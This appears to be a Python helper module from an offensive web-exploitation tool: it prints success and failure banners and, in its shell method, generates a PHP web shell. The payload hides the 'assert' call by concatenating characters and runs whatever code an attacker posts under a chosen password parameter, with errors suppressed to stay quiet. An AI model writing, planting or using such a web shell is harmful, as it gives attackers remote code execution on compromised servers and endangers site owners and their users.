class results:

    def success(self):
        print("###################################")
        print("\033[5;32m[+]          success\033[0m")

        print("###################################")
        return "true"

    def false(self):
        print("###################################")
        print("\033[5;31m[+]  false;please try again\033[0m")
        print("###################################")
        return "false"

    def shell(self,pwd):
        payload ="<?php\nclass web{{\nfunction __destruct(){{\n$b = 'a'.'s'.'s'.'e'.'r'.'t';\n@$b($this->con);\n}}\n}}\n$a = new web();\n$a ->con =$_POST['{}'];?>".format(pwd)
        return payload





